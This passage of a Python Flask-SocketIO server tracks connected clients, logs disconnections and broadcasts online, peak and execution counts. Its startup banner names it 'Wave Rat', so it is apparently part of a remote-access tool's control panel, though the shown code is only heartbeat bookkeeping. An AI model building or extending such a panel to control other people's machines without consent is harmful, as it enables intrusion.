            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                was_online = p.get("online", False)
                p["online"] = now - p["last"] < 15
                if was_online and not p["online"]:
                    add_history("disconnect", p["username"], "Perdu")
                if p["online"]:
                    online += 1
        for uid in to_remove:
            p = connected_players.pop(uid, {})
            add_history("disconnect", p.get("username", "Unknown"), "Déconnecté")
        if online > peak_players:
            peak_players = online
            save_stats()
        socketio.emit("update", {"players": {k: v for k, v in connected_players.items()}, "online": online, "peak": peak_players, "total_exec": total_executions})
        socketio.sleep(3)

if __name__ == "__main__":
    print("Wave Rat démarré → http://0.0.0.0:5000")
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000, allow_unsafe_werkzeug=True)
